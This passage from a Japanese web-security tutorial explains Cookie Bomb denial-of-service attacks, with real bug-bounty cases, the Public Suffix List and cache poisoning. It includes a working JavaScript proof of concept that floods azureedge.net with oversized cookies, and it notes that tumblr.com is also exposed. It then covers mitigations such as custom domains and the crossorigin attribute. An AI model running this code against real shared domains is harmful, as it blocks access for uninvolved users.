d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>URLハッシュと<code>document.referrer</code>のデータがCookieに格納され、<code>document.referrer</code>はまったくエンコードされていないことがわかります。したがって、この脆弱性を使用して任意のCookieを書き込むことが可能です。<code>document.referrer</code>を悪用することで、非常に長いCookieを書き込み、サービス拒否（DoS）攻撃を引き起こすことができます。</p><p>ユーザーがCookie Bombのリンクをクリックすると、Twitterにアクセスしたときにエラーページが表示されます。</p><p>2番目の例は、s_p_q_r氏が2015年にShopifyに報告した脆弱性です：<a href="https://hackerone.com/reports/105363" target="_blank" rel="noopener noreferrer">[livechat.shopify.com] Cookie bomb at customer chats</a>。この場合、フロントエンドコードはURLの情報をCookieの内容として直接使用します。書き込む前に、内容はエンコードされます。例えば、<code>,</code>は<code>%2C</code>になり、長さが3倍になります。したがって、非常に長いURLを渡すことで、Cookie Bombを作成できます。</p><p>最後の例は、bihari_web氏が2020年にNordVPNに報告した脆弱性です：<a href="https://hackerone.com/reports/777984" target="_blank" rel="noopener noreferrer">Denial of Service with Cookie Bomb</a>。</p><p>前の2つのケースと同様に、URLの情報（パスや特定のクエリ文字列など）が抽出され、長さ制限なしにCookieに書き込まれることが発見されました。したがって、非常に長いURLを使用してCookie Bombを作成できます。</p><p>攻撃対象領域について引き続き説明する前に、まずいくつかの防御策について言及しましょう。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="防御策">防御策<a href="#防御策" class="hash-link" aria-label="防御策 への直接リンク" title="防御策 への直接リンク">​</a></h2><p>最初のポイントは、ユーザー入力を信頼しないことです。例えば、前述の例：<code>https://example.com/log?uid=abc</code>では、<code>abc</code>を直接Cookieに書き込むべきではありません。代わりに、形式や長さなどの基本的なチェックを実行して、この種の攻撃を防ぐ必要があります。</p><p>次に、サブドメインからルートドメインにCookieを設定することについて言及したとき、多くの人が1つのことを考えるかもしれません。「共有サブドメインはどうなるのか？」</p><p>例えば、GitHub Pages機能では、各ユーザーのドメインは<code>username.github.io</code>です。では、すべてのGitHub Pagesに影響を与えるCookie Bombを作成できないでしょうか？自分のサブドメインに悪意のあるHTMLページを作成し、Cookieを設定するJavaScriptコードを含めるだけです。そして、このページを誰かに送信し、クリックすると、サーバーによって拒否されるため、<code>*.github.io</code>リソースにアクセスできなくなります。</p><p>この仮説は妥当に思えますが、満たさなければならない前提条件があります。「ユーザーは<code>*.github.io</code>で<code>github.io</code>のCookieを設定できる」ということです。この前提条件が満たされない場合、Cookie Bombは実行できません。</p><p>実際、「上位ドメインがCookie設定の影響を受けないようにする」というような要件はたくさんあります。例えば、<code>a.com.tw</code>が<code>.com.tw</code>や<code>.tw</code>のCookieを設定できる場合、多くの無関係なウェブサイトがCookieを共有することになるのではないでしょうか？これは明らかに不合理です。</p><p>あるいは、総統府のウェブサイト<code>https://www.president.gov.tw</code>を考えてみましょう。財務省のウェブサイト<code>https://www.mof.gov.tw</code>の影響を受けるべきではありません。したがって、<code>.gov.tw</code>もCookieを設定できないドメインであるべきです。</p><p>オリジンとサイトについて話すときに、実際にこの概念に言及したことをまだ覚えているかどうかわかりません。</p><p>ブラウザが特定のドメインにCookieを設定できるかどうかを判断する際、<a href="https://publicsuffix.org/list/" target="_blank" rel="noopener noreferrer">パブリックサフィックスリスト</a>と呼ばれるリストを参照します。このリストに表示されるドメインは、サブドメインのCookieを直接設定できません。</p><p>例えば、以下のドメインはこのリストに含まれています。</p><ol><li>com.tw</li><li>gov.tw</li><li>github.io</li></ol><p>したがって、前述の例は有効ではありません。なぜなら、<code>userA.github.io</code>にいるとき、<code>github.io</code>のCookieを設定できないため、Cookie Bomb攻撃を実行できないからです。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="攻撃対象領域の拡大">攻撃対象領域の拡大<a href="#攻撃対象領域の拡大" class="hash-link" aria-label="攻撃対象領域の拡大 への直接リンク" title="攻撃対象領域の拡大 への直接リンク">​</a></h2><p>前述の攻撃が成功するための前提条件は2つあります。</p><ol><li>任意のCookieを設定できる場所を見つける。</li><li>ターゲットがステップ1で見つかったURLをクリックする必要がある。</li></ol><p>攻撃を成功しやすくするために、これら2つの前提条件に関して次のように考えることができます。</p><ol><li>この場所を簡単に見つけることは可能か？</li><li>ターゲットがリンクをクリックせずに侵害されることは可能か？</li></ol><p>2番目のポイントは、キャッシュポイズニングと呼ばれる脆弱性を介して達成できます。</p><p>名前が示すように、この脆弱性はキャッシュ内のコンテンツを汚染することを含みます。例えば、多くのウェブサイトにはキャッシュがあり、異なるユーザーが同じキャッシュにアクセスする可能性があります。この場合、キャッシュサーバーに破損したレスポンスを保存させる方法を見つけることができます。こうすることで、他のすべてのユーザーも破損したファイルを受信し、同じエラーメッセージが表示されます。</p><p>このようにして、ターゲットはリンクをクリックしなくても侵害される可能性があり、攻撃は1人から全員に拡大されます。</p><p>これには<a href="https://cpdos.org/" target="_blank" rel="noopener noreferrer">CPDoS（Cache Poisoned Denial of Service）</a>という特定の用語があります。キャッシュを利用するため、もはやCookie Bombとは関係ありません。Cookieを使用せずに自分のコンピュータから直接攻撃を開始することもできます。</p><p>次に、最初の点を見てみましょう。「この場所を簡単に見つけることは可能か？」。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="cookieを簡単に設定できる場所を見つける">Cookieを簡単に設定できる場所を見つける<a href="#cookieを簡単に設定できる場所を見つける" class="hash-link" aria-label="Cookieを簡単に設定できる場所を見つける への直接リンク" title="Cookieを簡単に設定できる場所を見つける への直接リンク">​</a></h2><p>Cookie Bombを実行するためにCookieを簡単に設定できる場所はありますか？はい、それは前述の共有サブドメイン、例えば<code>*.github.io</code>のようなものです。</p><p>しかし、これらのドメインは既にパブリックサフィックスリストに含まれていませんか？Cookieを設定できません。</p><p>リストにないものを見つければいいだけです！</p><p>しかし、これは簡単なことではありません。なぜなら、知っているサービスのほとんどは既に登録されていることがわかるからです。例えば、GitHub、AmazonS3、Heroku、Netlifyなどは既にリストに載っています。</p><p>しかし、リストに載っていないものを見つけました。それはMicrosoftが提供するAzure CDN：azureedge.netです。</p><p>理由はわかりませんが、このドメインはパブリックサフィックスに属していないため、独自のCDNを作成すれば、Cookie Bombを実行できます。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="pocの作成">PoCの作成<a href="#pocの作成" class="hash-link" aria-label="PoCの作成 への直接リンク" title="PoCの作成 への直接リンク">​</a></h2><p>デモに使用したコードは次のとおりです。<a href="https://github.com/wrr/cookie-bomb/blob/master/bomb.html" target="_blank" rel="noopener noreferrer">こちら</a>から参照および変更しました。</p><div class="language-js codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-js codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> domain </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;azureedge.net&#x27;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> cookieCount </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">40</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> cookieLength </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">3000</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> expireAfterMinute </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">setCookieBomb</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">setCookie</span><span class="token punctuation" style="color:#393A34">(</span><span class="token parameter">key</span><span class="token parameter punctuation" style="color:#393A34">,</span><span class="token parameter"> value</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> expires </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token class-name">Date</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">+</span><span class="token keyword" style="color:#00009f">new</span><span class="token plain"> </span><span class="token class-name">Date</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> expireAfterMinute </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">60</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1000</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token dom variable" style="color:#36acaa">document</span><span class="token punctuation" style="color:#393A34">.</span><span class="token property-access">cookie</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> key </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;=&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> value </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;; path=/; domain=&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> domain </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;; Secure; SameSite=None; expires=&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> expires</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">toUTCString</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">function</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">setCookieBomb</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword" style="color:#00009f">const</span><span class="token plain"> value </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;Boring&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">&#x27;_&#x27;</span><span class="token punctuation" style="color:#393A34">.</span><span class="token method function property-access" style="color:#d73a49">repeat</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">cookieLength</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token keyword control-flow" style="color:#00009f">for</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">let</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">=</span><span class="token number" style="color:#36acaa">0</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">&lt;</span><span class="token plain">cookieCount</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> i</span><span class="token operator" style="color:#393A34">++</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token function" style="color:#d73a49">setCookie</span><span class="token punctuation" style="color:#393A34">(</span><span class="token string" style="color:#e3116c">&#x27;key&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> i</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> value</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="クリップボードにコードをコピー" title="コピー" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>次に、ファイルをAzureにアップロードし、CDNを設定します。</p><p>クリックすると、<code>azureedge.net</code>にたくさんのジャンクCookieが設定されます。</p><p><img loading="lazy" src="/beyond-xss/ja/assets/images/26-02-ef26c2c17aefa466b4418451d3ea3eab.png" width="1157" height="599" class="img_ev3q"></p><p>更新後、ウェブサイトにアクセスできなくなっていることがわかります。</p><p><img loading="lazy" src="/beyond-xss/ja/assets/images/26-03-6794c39c9c71964ee67f570b98a77299.png" width="1260" height="470" class="img_ev3q"></p><p>これはCookie Bombが成功したことを意味します。</p><p>したがって、<code>azureedge.net</code>に配置されたリソースはすべて影響を受けます。</p><p>実際には、Azure CDNにはカスタムドメインを使用する機能があるため、カスタムドメインを使用している場合は影響を受けません。ただし、一部のウェブサイトはカスタムドメインを使用せず、URLとして直接<code>azureedge.net</code>を使用しています。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="緩和策">緩和策<a href="#緩和策" class="hash-link" aria-label="緩和策 への直接リンク" title="緩和策 への直接リンク">​</a></h2><p>最善の緩和策は、デフォルトの<code>azureedge.net</code>の代わりにカスタムドメインを使用することです。こうすれば、Cookie Bombの問題は発生しません。しかし、カスタムドメインはさておき、問題を真に解決するには<code>azureedge.net</code>をパブリックサフィックスとして登録する必要があります。</p><p>これら2つの防御策以外に、思いつかなかったかもしれないもう1つの防御策があります。</p><p>フロントエンドエンジニアとして、私たちは通常、次のようにリソースをインクルードします。</p><div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">script</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">src</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">htps://test.azureedge.net/bundle.js</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token script"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">script</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="クリップボードにコードをコピー" title="コピー" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p><code>crossorigin</code>属性を追加するだけです。</p><div class="language-html codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-html codeBlock_bY9V thin-scrollbar"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token tag punctuation" style="color:#393A34">&lt;</span><span class="token tag" style="color:#00009f">script</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">src</span><span class="token tag attr-value punctuation attr-equals" style="color:#393A34">=</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag attr-value" style="color:#e3116c">htps://test.azureedge.net/bundle.js</span><span class="token tag attr-value punctuation" style="color:#393A34">&quot;</span><span class="token tag" style="color:#00009f"> </span><span class="token tag attr-name" style="color:#00a4db">crossorigin</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><span class="token script"></span><span class="token tag punctuation" style="color:#393A34">&lt;/</span><span class="token tag" style="color:#00009f">script</span><span class="token tag punctuation" style="color:#393A34">&gt;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="クリップボードにコードをコピー" title="コピー" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>リクエストを行う際に<code>crossorigin</code>属性を使用することで、Cookie Bomb攻撃を回避できます。デフォルトでは、リクエストを送信する際にCookieが含まれます。ただし、<code>crossorigin</code>属性を使用してクロスオリジン方式でリクエストを行うと、デフォルトではCookieは含まれません。これにより、「ヘッダーが大きすぎる」問題の発生を防ぐことができます。</p><p>CDN側でも設定を調整することを忘れないでください。サーバーがクロスオリジンリソースリクエストを許可するために<code>Access-Control-Allow-Origin</code>ヘッダーを追加していることを確認してください。</p><p>以前は<code>crossorigin</code>属性をいつ使用するのか混乱していましたが、今ではユースケースの1つがわかりました。リクエストにCookieを含めたくない場合は、<code>crossorigin</code>属性を追加できます。</p><h2 class="anchor anchorWithStickyNavbar_LWe7" id="もう一つの実際の事例">もう一つの実際の事例<a href="#もう一つの実際の事例" class="hash-link" aria-label="もう一つの実際の事例 への直接リンク" title="もう一つの実際の事例 への直接リンク">​</a></h2><p>元々は特定のニッチに焦点を当てていたが、後にAutomatticに買収されたTumblrには、ユーザーが個人のページでCSSとJavaScriptをカスタマイズできる特別な機能があります。これらの個人ページのドメインはuserA.tumblr.comという形式です。tumblr.comはパブリックサフィックスに登録されていないため、Cookie Bomb攻撃の影響も受けます。</p><p>ChromeまたはEdgeで次のURLにアクセスし、更新するかTumblrのホームページに移動すると、アクセスできないことに気づくでしょう。</p><p><img loading="lazy" src="data:image/png;base64,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